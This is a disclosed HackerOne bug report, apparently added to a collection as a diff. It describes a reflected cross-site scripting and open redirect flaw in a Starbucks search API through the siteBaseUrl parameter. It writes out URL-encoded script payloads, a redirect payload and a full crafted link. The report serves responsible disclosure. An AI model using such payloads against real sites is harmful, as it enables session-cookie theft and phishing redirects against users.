@@ -1,0 +1,35 @@
+ReportLink:https://hackerone.com/reports/213190
+WeaknessName:Cross-site Scripting (XSS) - Generic
+Reporter:https://hackerone.com/an0n-j
+ReportedTo:Starbucks(starbucks)
+BountyAmount:
+Severity:medium
+State:Closed
+DateOfDisclosure:25.07.2017 21:03:56
+
+Summary:
+
+Hi Starbucks team,
+While testing i founded Reflected XSS in openapi.starbucks.com that can also lead to Open redirect
+Vulnerable link
+==========
+https://openapi.starbucks.com/searchasyoutype/v1/search?x-api-key=██████&query=coffe&partnerid=████:vwt2u5wngbk&siteBaseUrl=
+Vulnerable parameter
+===============
+siteBaseUrl
+Payloads
+======
+```1). http://googl.com/%0a<body onload=%61lert(%64ocument.%63ookie)>%
+2). http://googl.com/%0a<body onload=prompt(%64ocument.domain)>%```
+For Open redirect the payload is
+=====================
+```
+http://googl.com/%0a<script>window.location='https://google.com';</script>%
+```
+
+So the finalized link with payload is given below
+```
+https://openapi.starbucks.com/searchasyoutype/v1/search?x-api-key=██████&query=coffe&partnerid=███████:vwt2u5wngbk&siteBaseUrl=http://googl.com/%0a<body onload=%61lert(%64ocument.%63ookie)>%
+```
+
+POC has been attached
